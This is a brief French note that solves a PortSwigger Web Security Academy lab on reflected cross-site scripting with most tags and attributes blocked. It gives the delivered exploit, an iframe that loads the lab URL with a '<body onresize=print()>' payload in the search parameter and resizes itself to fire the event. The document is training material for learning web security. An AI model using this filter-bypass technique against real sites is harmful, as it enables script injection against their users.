# Lab

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

## Payload

Exploit à délivrer : 

```html
<iframe src="https://0ac3008104e26490812afcb900d000b5.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width= '1000px'">
</iframe>
```

Payload seul : `<body onresize=print()>`

Ensuite faire un iframe qui se resize pour éxécuter le payload.